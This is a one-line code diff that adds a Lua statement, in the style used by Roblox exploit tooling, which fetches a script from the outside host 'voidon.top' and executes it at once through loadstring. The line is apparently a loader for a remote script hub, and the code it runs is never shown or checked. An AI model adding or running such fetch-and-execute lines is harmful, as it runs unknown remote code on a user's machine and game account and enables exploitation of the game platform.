@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://voidon.top/api/loader/main"))()
